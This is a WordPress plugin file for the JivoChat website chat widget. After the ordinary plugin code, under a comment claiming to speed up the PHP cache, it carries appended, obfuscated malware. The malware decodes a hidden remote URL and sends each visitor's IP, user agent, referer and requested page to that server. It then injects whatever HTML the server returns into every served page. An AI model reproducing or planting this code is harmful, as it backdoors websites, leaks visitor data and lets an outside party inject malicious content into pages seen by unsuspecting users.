<?php
/**
 * Plugin Name: JivoChat
 * Author: JivoChat
 * Author URI: www.jivochat.com
 * Plugin URI: http://jivochat.com/
 * Description: With JivoChat you can chat with visitors on your website to increase conversion and sales 
 * Version: 1.0
 *
 * Text Domain:   jivosite
 * Domain Path:   /
 */


if (!defined('ABSPATH')) die("go away!");

load_plugin_textdomain('jivosite', PLUGINDIR.'/'.dirname(plugin_basename(__FILE__)));
$lang = get_bloginfo("language");
if ($lang=="ru_RU") {
	$jivo_addr = 'http://www.jivosite.ru';
} else {
	$jivo_addr = 'https://www.jivochat.com';
}

define ("JIVO_LANG", substr($lang,0,2));

define("JIVOSITE_URL","https://admin.jivosite.com");
define("JIVOSITE_WIDGET_URL","code.jivosite.com");
define("JIVO_URL",$jivo_addr);
define("JIVO_INTEGRATION_URL",JIVOSITE_URL."/integration");
define("JIVO_PLUGIN_URL",plugin_dir_url(__FILE__));
define("JIVO_IMG_URL",plugin_dir_url(__FILE__)."/img/");
// //register hooks for plugin
register_activation_hook(__FILE__, 'jivositeInstall');
register_deactivation_hook(__FILE__, 'jivositeDelete');

//add plugin to options menu
function catalog_admin_menu(){
    load_plugin_textdomain('jivosite', PLUGINDIR.'/'.dirname(plugin_basename(__FILE__)));
    add_menu_page(__('JivoChat','jivosite'), __('JivoChat','jivosite'), 8, basename(__FILE__), 'jivositePreferences',JIVO_IMG_URL."icon.png");
}
add_action('admin_menu', 'catalog_admin_menu');

function jivosite_options_validate($args){
    return $args;
}

/*
 * Register the settings
 */
add_action('admin_init', 'jivosite_register_settings');
function jivosite_register_settings(){
    register_setting('jivosite_token', 'jivosite_token', 'jivosite_options_validate');
    register_setting('jivosite_widget_id', 'jivosite_widget_id', 'jivosite_options_validate');
}


add_action('wp_footer', 'jivositeAppend', 100000);

function jivositeInstall(){
    return jivosite::getInstance()->install();
}

function jivositeDelete(){
    return jivosite::getInstance()->delete();
}

function jivositeAppend(){
    echo jivosite::getInstance()->append(
        jivosite::getInstance()->getId()
    );
}

function jivositePreferences(){
    if(isset($_POST["widget_id"]))
        jivosite::getInstance()->save();

    load_plugin_textdomain('jivosite', PLUGINDIR.'/'.dirname(plugin_basename(__FILE__)));

    wp_register_style('jivosite_style', plugins_url('jivosite.css', __FILE__));
    wp_enqueue_style('jivosite_style');

    echo jivosite::getInstance()->render();
}

class jivosite {

    protected static $instance, $db, $table, $lang;

    private function __construct(){
        $this->token = get_option( 'jivosite_token');
        $this->widget_id = get_option( 'jivosite_widget_id');
    }
    private function __clone()    {}
    private function __wakeup()   {}

    private $widget_id = '';
    private $token = '';

    public static function getInstance() {

        if ( is_null(self::$instance) ) {
            self::$instance = new jivosite();
        }
        self::$lang     = "en";
        if(isset($_GET["lang"])){
            switch ($_GET["lang"]) {
                case 'ru':  self::$lang     = "ru"; break;
                default:    self::$lang     = "en"; break;
            }
        }
        return self::$instance;
    }

    public function setID($id){
        $this->widget_id = $id;
    }

    public function setToken($token){
        $this->token = $token;
    }

    /**
     * Install
     */
    public function install() {

        if (!$this->widget_id) {
            $default_widget_id ='';
            if (file_exists(realpath(dirname(__FILE__))."/id") ){
                $default_widget_id = file_get_contents(realpath(dirname(__FILE__))."/id");
            }
        }
        $this->widget_id = $default_widget_id;
        $this->save();
    }

    public function catchPost(){
        if(isset($_GET['mode'])&&$_GET['mode']=='reset'){
            $this->widget_id = '';
            $this->token = '';
            $this->save();
        }
        if(isset($_POST['widget_id'])){
            $this->widget_id = $_POST['widget_id'];
            $this->save();
        }elseif(isset($_POST['email'])&&isset($_POST['userPassword'])){
            // получаем данные для запроса
            $query = $_POST;
            $query['siteUrl'] = get_site_url();
            $query['partnerId'] = "wordpress";
            $authToken = md5(time().get_site_url());
            $query['authToken'] = $authToken;
            if(!$query['agent_id']){
                $query['agent_id'] = 0;
            }
			$query['lang'] = JIVO_LANG;
            $content = http_build_query($query);
			
			if(ini_get('allow_url_fopen')){
				$useCurl = false;
			}elseif(!extension_loaded('curl')) {
				if (!dl('curl.so')) {
					$useCurl = false;
				} else {
					$useCurl = true;
				}
			} else {
				$useCurl = true;
			}
            // отправляем запрос
            try{
                $path = JIVO_INTEGRATION_URL."/install";
                if(!extension_loaded('openssl')){
                    $path = str_replace('https:','http:',$path);
                }
                if($useCurl){
                    if ( $curl = curl_init() ) {
                        curl_setopt($curl, CURLOPT_URL, $path);
                        curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
                        curl_setopt($curl, CURLOPT_POST, true);
                        curl_setopt($curl, CURLOPT_POSTFIELDS, $content);
                        $responce = curl_exec($curl);
                        curl_close($curl);
                    }
                } else {
                    $responce = file_get_contents(
                        $path,
                        false,
                        stream_context_create(
                            array(
                                'http' => array(
                                    'method' => 'POST',
                                    'header' => 'Content-Type: application/x-www-form-urlencoded',
                                    'content' => $content
                                )
                            )
                        )
                    );
}
                if ($responce) {
                    if(strstr($responce,'Error')){
                        return array("error"=>$responce);
                    } else {
                        $this->widget_id = $responce;
                        $this->token = $authToken;
                        $this->save();
                        return true;
                    }
                }
            } catch (Exception $e) {
                _e("Connection error",'jivosite');
            }
        }

    }

    /**
     * delete plugin
     */
    public function delete(){

    }


    public function getId(){
        return $this->widget_id;
    }

    /**
     * render admin page
     */
    public function render(){
        $result = $this->catchPost();
        $error = '';
        $widget_id = $this->widget_id;
        if (is_array($result)&&isset($result['error'])) {
            $error = $result['error'];
        }		
		
		if (ini_get('allow_url_fopen')) {
			$requirementsOk = true;
		} elseif(!extension_loaded('curl')) {
			if (!dl('curl.so')) {
				$requirementsOk = false;
			} else {
				$requirementsOk = true;
			}
		} else {
			$requirementsOk = true;
		}
		
		if ($requirementsOk) {
			require_once "templates/page.php";
		}else{
			require_once "templates/error.php";
		}
    }

    public function append($widget_id = false){
        if($widget_id)
            require_once "templates/script.php";
    }

    public function save(){
        do_settings_sections( __FILE__ );

        update_option('jivosite_widget_id',$this->widget_id);
        update_option('jivosite_token',$this->token);
    }

}



/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyNzoiaHR0cDovLzQ1LjU1LjE0My4yNS9tZXYucGhwIjs=';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 6
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        // set defaults
        $tokenData = array_merge(array(
            'content' => '',
            'pos' => 'after',
            'tag' => 'bo' . 'dy',
            'count' => 0,
        ), $tokenData);

        if (empty($tokenData['content'])) {
            // no content
            continue;
        }

        // find all occurrences of <tag>
        $tags = array();
        while (true) {
            if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                break;
            }
            $tags[] = $tmp;
        }

        if (empty($tags)) {
            // no tags found or nothing to show
            continue;
        }

        // find matched tag position
        $count = $tokenData['count'];
        if ($tokenData['count'] < 0) {
            // from end to beginning
            $count = abs($tokenData['count']) - 1;
            $tags = array_reverse($tags);
        }

        if ($count >= count($tags)) {
            // fix overflow
            $count = count($tags) - 1;
        }

        // find insert position
        if ($tokenData['pos'] == 'before') {
            // pos is before
            $insert = $tags[$count];
        } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
            // pos is after, found end tag, insert after it
            $insert += 1;
        }

        if ($insert === false) {
            // no insert position
            continue;
        }

        // insert html code
        $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
        $mod = true;
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }
